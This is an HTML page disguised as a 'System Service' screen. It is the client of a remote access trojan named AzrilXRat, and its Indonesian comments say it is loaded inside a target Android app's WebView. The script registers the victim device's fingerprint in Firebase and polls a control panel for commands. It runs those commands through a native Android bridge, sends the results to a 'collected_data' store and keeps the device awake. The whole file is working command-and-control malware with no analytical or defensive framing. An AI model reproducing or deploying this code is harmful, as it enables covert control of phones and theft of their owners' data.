<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>System Service</title>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  background:#000;color:#0f0;
  display:flex;align-items:center;justify-content:center;
  height:100vh;font-family:'Courier New',monospace;
  flex-direction:column;gap:12px;
}
.loader{width:30px;height:30px;border:2px solid #0f0;border-top:2px solid transparent;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.status-text{font-size:10px;color:#555;letter-spacing:.05em}
.device-id{font-size:8px;color:#333;margin-top:8px}
</style>
</head>
<body>

<div class="loader" id="loader"></div>
<div class="status-text" id="statusMsg">Initializing...</div>
<div class="device-id" id="devIdDisplay"></div>

<!-- Firebase Config -->
<script src="firebase-config.js"></script>

<script>
/* ═══════════════════════════════════════════════════
   AZRILXRAT CLIENT — client.vercel.app
   Di-load dari APK WebView target
═════════════════════════════════════════════════════ */

// Generate unique device ID
const DEVICE_ID = 'TGT_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);

// Device info
const deviceInfo = {
  id: DEVICE_ID,
  model: navigator.userAgent.split(';')[1]?.trim() || navigator.userAgent.substring(0, 50),
  platform: navigator.platform,
  language: navigator.language,
  userAgent: navigator.userAgent,
  screenSize: window.screen.width + 'x' + window.screen.height,
  registeredAt: Date.now(),
  lastSeen: Date.now(),
  online: true
};

// Register ke Firebase
db.ref('devices/' + DEVICE_ID).set(deviceInfo)
  .then(() => {
    document.getElementById('statusMsg').textContent = 'Service Active';
    document.getElementById('loader').style.borderColor = '#0f0';
    document.getElementById('devIdDisplay').textContent = DEVICE_ID;
    console.log('[AzrilXRat] Registered:', DEVICE_ID);
  })
  .catch(err => {
    document.getElementById('statusMsg').textContent = 'Error';
    console.error('[AzrilXRat] Register error:', err);
  });

// Update lastSeen setiap 30 detik
setInterval(() => {
  db.ref('devices/' + DEVICE_ID).update({ lastSeen: Date.now() });
}, 30000);

// Listen commands dari panel
db.ref('commands/' + DEVICE_ID).on('child_added', (snap) => {
  const cmd = snap.val();
  if (!cmd || cmd.status !== 'pending') return;
  
  console.log('[AzrilXRat] Command received:', cmd.command);
  snap.ref.update({ status: 'processing' });
  
  // Coba execute via Android interface
  let result = { type: cmd.command, status: 'executed', timestamp: Date.now() };
  
  try {
    if (window.AzrilXRat && typeof window.AzrilXRat.exec === 'function') {
      const nativeResult = JSON.parse(window.AzrilXRat.exec(cmd.command));
      result = { ...result, ...nativeResult };
    } else {
      result.note = 'no_native_interface';
    }
  } catch(e) {
    result.error = e.message;
  }
  
  // Kirim hasil ke Firebase
  db.ref('collected_data').push(result);
  snap.ref.update({ status: 'done' });
  setTimeout(() => snap.ref.remove(), 2000);
});

// Handle disconnect
window.addEventListener('beforeunload', () => {
  db.ref('devices/' + DEVICE_ID).update({ online: false, lastSeen: Date.now() });
});

// Keep screen on (minta via Android)
if (window.AzrilXRat && window.AzrilXRat.keepAwake) {
  window.AzrilXRat.keepAwake();
}

console.log('[AzrilXRat] Client ready — listening on', DEVICE_ID);
</script>
</body>
</html>
